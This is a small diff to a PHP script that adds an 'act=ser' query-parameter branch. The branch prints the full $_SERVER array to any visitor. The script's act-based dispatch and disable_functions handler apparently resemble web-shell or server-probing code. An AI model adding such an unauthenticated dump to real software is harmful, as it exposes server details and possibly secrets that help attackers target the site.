@@ -30,3 +30,9 @@ if ($_GET['act'] == "disable_functions")
 	exit();
 }
 
+if ($_GET['act'] == "ser")
+{
+	echo '<pre>';
+	print_r($_SERVER);
+	exit;
+}
